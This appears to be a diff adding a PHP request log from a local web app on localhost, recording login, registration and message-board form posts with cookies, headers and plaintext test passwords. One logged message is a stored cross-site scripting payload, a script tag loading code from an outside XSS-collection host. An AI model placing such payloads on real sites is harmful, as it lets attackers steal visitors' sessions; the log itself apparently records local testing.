+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => 972i2iju62m7h22003cms4uj71
+            [monitor_count] => 83
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 35
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/login.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=972i2iju62m7h22003cms4uj71; monitor_count=83
+        )
+
+)
+
+1541124067
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => 123
+            [password] => 123
+            [authcode] => 
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => 972i2iju62m7h22003cms4uj71
+            [monitor_count] => 87
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 35
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/login.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=972i2iju62m7h22003cms4uj71; monitor_count=87
+        )
+
+)
+
+1541124073
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [date] => 
+            [message] => 123
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => 972i2iju62m7h22003cms4uj71
+            [monitor_count] => 89
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 17
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/addMessage.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=972i2iju62m7h22003cms4uj71; monitor_count=89
+        )
+
+)
+
+1541124081
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [date] => 2018-11-12
+            [message] => 123
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => 972i2iju62m7h22003cms4uj71
+            [monitor_count] => 91
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 27
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/addMessage.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=972i2iju62m7h22003cms4uj71; monitor_count=91
+        )
+
+)
+
+1541124156
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => 123
+            [password] => 123
+            [repasswd] => 123
+            [authcode] => bdyi
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => 972i2iju62m7h22003cms4uj71
+            [monitor_count] => 103
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 52
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/zc.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=972i2iju62m7h22003cms4uj71; monitor_count=103
+        )
+
+)
+
+1541124171
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => 456
+            [password] => 456
+            [repasswd] => 456
+            [authcode] => btfo
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => 972i2iju62m7h22003cms4uj71
+            [monitor_count] => 105
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 52
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/zc.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=972i2iju62m7h22003cms4uj71; monitor_count=105
+        )
+
+)
+
+1541124234
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => 456
+            [password] => 456
+            [authcode] => 
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => 972i2iju62m7h22003cms4uj71
+            [monitor_count] => 114
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 35
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/login.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=972i2iju62m7h22003cms4uj71; monitor_count=114
+        )
+
+)
+
+1541124273
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => admin
+            [password] => adminp@ssw0rd
+            [repasswd] => adminp@ssw0rd
+            [authcode] => q4gv
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => 972i2iju62m7h22003cms4uj71
+            [monitor_count] => 118
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 78
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/zc.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=972i2iju62m7h22003cms4uj71; monitor_count=118
+        )
+
+)
+
+1541124301
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => admin
+            [password] => adminp@ssw0rd
+            [repasswd] => adminp@ssw0rd
+            [authcode] => uzhd
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => 972i2iju62m7h22003cms4uj71
+            [monitor_count] => 120
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 78
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/zc.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=972i2iju62m7h22003cms4uj71; monitor_count=120
+        )
+
+)
+
+1541124312
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => admin
+            [password] => adminp@ssw0rd
+            [authcode] => wpzx
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => 972i2iju62m7h22003cms4uj71
+            [monitor_count] => 122
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 53
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/login.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=972i2iju62m7h22003cms4uj71; monitor_count=122
+        )
+
+)
+
+1541124344
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => admin
+            [password] => adminp@ssw0rd
+            [authcode] => udg6
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => 972i2iju62m7h22003cms4uj71
+            [monitor_count] => 127
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 53
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/login.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=972i2iju62m7h22003cms4uj71; monitor_count=127
+        )
+
+)
+
+1541124358
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => admin
+            [password] => adminp@ssw0rd
+            [authcode] => hlqi
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => 972i2iju62m7h22003cms4uj71
+            [monitor_count] => 129
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 53
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/login.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=972i2iju62m7h22003cms4uj71; monitor_count=129
+        )
+
+)
+
+1541125071
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => admin
+            [password] => adminp@ssw0rd
+            [authcode] => o3eu
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => 972i2iju62m7h22003cms4uj71
+            [monitor_count] => 137
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 53
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/login.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=972i2iju62m7h22003cms4uj71; monitor_count=137
+        )
+
+)
+
+1541126142
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => 123
+            [password] => 123
+            [repasswd] => 123
+            [authcode] => 14mm
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => 972i2iju62m7h22003cms4uj71
+            [monitor_count] => 151
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 52
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/zc.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=972i2iju62m7h22003cms4uj71; monitor_count=151
+        )
+
+)
+
+1541126155
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => 123
+            [password] => 123
+            [repasswd] => 123
+            [authcode] => mq9a
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => 972i2iju62m7h22003cms4uj71
+            [monitor_count] => 153
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 52
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/zc.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=972i2iju62m7h22003cms4uj71; monitor_count=153
+        )
+
+)
+
+1541126169
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => 123
+            [password] => 123
+            [authcode] => hyxl
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => 972i2iju62m7h22003cms4uj71
+            [monitor_count] => 156
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 39
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/login.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=972i2iju62m7h22003cms4uj71; monitor_count=156
+        )
+
+)
+
+1541126199
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [date] => 2018-11-02
+            [message] => 2323223222
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => 972i2iju62m7h22003cms4uj71
+            [monitor_count] => 160
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 34
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/addMessage.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=972i2iju62m7h22003cms4uj71; monitor_count=160
+        )
+
+)
+
+1541126217
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [date] => 2018-11-02
+            [message] => <script src=http://xsspt.com/QIWDcw?1541125788></script>
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => 972i2iju62m7h22003cms4uj71
+            [monitor_count] => 164
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 102
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/addMessage.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=972i2iju62m7h22003cms4uj71; monitor_count=164
+        )
+
+)
+
+1541126234
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => admin
+            [password] => adminp@ssw0rd
+            [authcode] => f4d6
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => 972i2iju62m7h22003cms4uj71
+            [monitor_count] => 167
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 53
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/login.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=972i2iju62m7h22003cms4uj71; monitor_count=167
+        )
+
+)
+
+1541126281
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => 123
+            [password] => 123
+            [authcode] => j3ex
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => 972i2iju62m7h22003cms4uj71
+            [monitor_count] => 172
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 39
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/login.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=972i2iju62m7h22003cms4uj71; monitor_count=172
+        )
+
+)
+
+1541126347
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => admin
+            [password] => adminp@ssw0rd
+            [authcode] => qxzv
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => 972i2iju62m7h22003cms4uj71
+            [monitor_count] => 175
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 53
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/login.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=972i2iju62m7h22003cms4uj71; monitor_count=175
+        )
+
+)
+
+1541668297
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => 123
+            [password] => 123
+            [authcode] => ncex
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [PHPSESSID] => 8p09f2ngncn8tvq270uohelhi6
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 39
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [Content-Type] => application/x-www-form-urlencoded
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+            [Referer] => http://localhost:8088/login.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; PHPSESSID=8p09f2ngncn8tvq270uohelhi6
+        )
+
+)
+
+1541668345
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => admin
+            [password] => adminp@ssw0rd
+            [authcode] => jge4
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [PHPSESSID] => 8p09f2ngncn8tvq270uohelhi6
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 53
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [Content-Type] => application/x-www-form-urlencoded
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+            [Referer] => http://localhost:8088/login.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; PHPSESSID=8p09f2ngncn8tvq270uohelhi6
+        )
+
+)
